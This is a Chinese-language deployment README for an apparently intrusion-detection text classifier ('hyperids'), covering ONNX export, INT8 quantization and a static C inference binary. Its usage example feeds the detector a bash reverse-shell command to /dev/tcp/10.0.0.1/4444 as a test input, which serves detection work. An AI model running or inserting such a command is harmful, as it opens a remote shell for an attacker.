# 部署

最终模型：`prajjwal1/bert-small`（29.8M）+ 31 标签（verdict 3 + action 28）。
MITRE tactic/technique 由 `hyperids.schema.derive_attck()` 规则表推导，不在模型中预测。

## 两种部署方式

| 方式 | 产物 | 依赖 | 峰值 RSS |
|---|---|---|---|
| ONNX Runtime（INT8） | `model_int8.onnx` 30.2MB | onnxruntime | 96.2MB |
| **C 单二进制（推荐）** | 静态可执行文件 ~31MB | 无（statically linked） | **~38 MiB** |

## 使用流程

```bash
# 1) 导出 ONNX（31 标签一次前向）
python deploy/export_onnx.py --model_dir model/checkpoints_gpu/final_model_v2 \
    --out model/checkpoints_gpu/final_model_v2/model.onnx --chunk 31 --seq_len 320

# 2) INT8 量化
python deploy/quantize_int8.py --in model/checkpoints_gpu/final_model_v2/model.onnx \
    --out model/checkpoints_gpu/final_model_v2/model_int8.onnx

# 3) C 单二进制（纯 C 推理，权重 int8 内嵌）
cd deploy/c_runtime && make
./build/hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

## 推理约定

31 标签一次前向输出 logits：前 3 个是 verdict（softmax/argmax），后 28 个是 action
（sigmoid，阈值 0.5）。拿到 action 集合后调用 `schema.derive_attck(actions)` 得到 tactic/technique。

详见 `deploy/c_runtime/README.md`。
